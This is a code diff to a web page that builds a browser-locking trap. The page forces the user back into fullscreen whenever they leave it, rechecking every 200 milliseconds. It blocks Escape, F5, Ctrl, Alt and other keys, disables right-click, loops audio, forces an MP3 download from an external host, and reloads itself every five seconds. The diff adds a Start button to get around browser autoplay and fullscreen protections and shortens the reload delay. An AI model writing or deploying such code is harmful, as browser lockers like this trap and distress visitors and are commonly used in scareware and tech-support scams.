@@ -42,12 +42,10 @@
       pointer-events: none;
     }
 
-    /* Hide cursor and obscure browser controls */
     body.fullscreen {
       cursor: none;
     }
 
-    /* Overlay to block browser UI */
     .overlay {
       position: fixed;
       top: 0;
@@ -56,7 +54,26 @@
       height: 100vh;
       background: transparent;
       z-index: 10000;
-      pointer-events: none; /* Allow interaction with content beneath */
+      pointer-events: none;
+    }
+
+    /* Start button for user interaction */
+    .start-button {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 20px 40px;
+      font-size: 24px;
+      background-color: #ff0000;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      z-index: 10001;
+      border-radius: 10px;
+    }
+    .start-button.hidden {
+      display: none;
     }
   </style>
 </head>
@@ -67,15 +84,17 @@
     </div>
   </div>
   <div class="overlay" id="overlay"></div>
+  <button class="start-button" id="startButton">Start</button>
 
   <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>
 
   <script>
     const popup = document.getElementById('popup');
     const audio = document.getElementById('aud');
+    const startButton = document.getElementById('startButton');
     const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';
 
-    // Function to trigger MP3 download
+    // Trigger MP3 download
     function triggerDownload(url, filename) {
       const a = document.createElement('a');
       a.href = url;
@@ -99,20 +118,16 @@
       document.body.classList.add('fullscreen');
     }
 
-    // Attempt to play audio
+    // Play audio
     function tryPlayAudio() {
       audio.play().catch((error) => {
         console.log('Autoplay prevented:', error);
-        document.addEventListener('click', () => {
-          audio.play().catch(() => {});
-          enterFullscreen(); // Re-enter fullscreen on user interaction
-        }, { once: true });
+        // Audio will play after user interaction via start button
       });
     }
 
     // Advanced fullscreen trap
     function trapFullscreen() {
-      // Detect fullscreen exit
       document.addEventListener('fullscreenchange', () => {
         if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
           enterFullscreen();
@@ -129,7 +144,6 @@
         }
       });
 
-      // Block keyboard shortcuts
       document.addEventListener('keydown', (e) => {
         const blockedKeys = ['Escape', 'F5', 'Tab', 'Alt', 'Control', 'Meta'];
         if (blockedKeys.includes(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
@@ -139,29 +153,25 @@
         }
       });
 
-      // Block mouse interactions that could reveal browser UI
       document.addEventListener('mousemove', (e) => {
         if (e.clientY < 50 || e.clientX < 50 || e.clientX > window.innerWidth - 50) {
-          // If mouse nears top/left/right edges, re-enter fullscreen
           enterFullscreen();
         }
       });
 
-      // Periodically enforce fullscreen
       setInterval(() => {
         if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
           enterFullscreen();
         }
-      }, 200); // Aggressive check every 200ms
+      }, 200);
 
-      // Block context menu
       document.addEventListener('contextmenu', (e) => e.preventDefault());
     }
 
     // Handle single download
     function handleDownloads() {
       triggerDownload(mp3Url, '1.mp3');
-      // Note: Multiple downloads commented out to avoid prompts
+      // Multiple downloads (uncomment for testing, but expect prompts)
       /*
       const downloadCount = 3;
       let delay = 100;
@@ -174,16 +184,30 @@
       */
     }
 
-    window.addEventListener('load', () => {
+    // Initialize after user interaction
+    function initialize() {
+      startButton.classList.add('hidden'); // Hide button
       enterFullscreen();
       trapFullscreen();
       tryPlayAudio();
       handleDownloads();
 
-      // Refresh page after a delay (optional)
+      // Faster page refresh
       setTimeout(() => {
         window.location.reload();
-      }, 15000); // 15 seconds to allow download and reduce strain
+      }, 5000); // 5 seconds
+      // For even faster refresh (e.g., 3 seconds), uncomment below but test for stability
+      // setTimeout(() => { window.location.reload(); }, 3000);
+    }
+
+    // Start button click handler
+    startButton.addEventListener('click', () => {
+      audio.play().catch((error) => console.log('Audio play failed:', error));
+      initialize();
+    });
+
+    window.addEventListener('load', () => {
+      // Wait for user interaction via start button instead of auto-initializing
     });
 
     // Handle visibility change
@@ -202,7 +226,7 @@
       enterFullscreen();
     });
     document.addEventListener('mousedown', (e) => {
-      if (e.button === 2) { // Right-click
+      if (e.button === 2) {
         e.preventDefault();
         enterFullscreen();
       }
